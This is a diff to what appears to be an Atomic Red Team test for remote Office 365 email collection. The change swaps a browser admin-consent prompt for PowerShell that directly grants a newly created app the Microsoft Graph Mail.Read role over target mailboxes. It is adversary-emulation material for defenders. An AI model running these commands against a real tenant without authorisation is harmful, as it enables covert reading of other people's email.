@@ -46,10 +46,11 @@ atomic_tests:
       $users = get-MgUser
       $app = New-MgApplication -DisplayName "T1114.002 Atomic Test #1 - Office365 - Remote Email Collection" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris="http://localhost"; } -KeyCredentials @(@{ Type="AsymmetricX509Cert"; Usage="Verify"; Key=$cert.RawData })
       New-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null
-      $adminConsentUrl = "https://login.microsoftonline.com/" + $context.TenantId + "/adminconsent?client_id=" + $app.appId
-      Start-Process $adminConsentUrl
-      Read-Host -Prompt "After browser log-in, press Enter to Continue" 
-      Write-Host "Enter 3 email addresses in the tenant"
+      $resourceSPN = Get-MgServicePrincipal -Filter "AppId eq '$($app.AppId)'"
+      $graphApiApp = Get-MgServicePrincipal -Filter "DisplayName eq 'Microsoft Graph'"
+      $mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq "Mail.Read"
+      New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id
+      
       $mailbox1 = "#{1st_target_mailbox}"
       $mailbox2 = "#{2nd_target_mailbox}"
       $mailbox3 = "#{3rd_target_mailbox}"
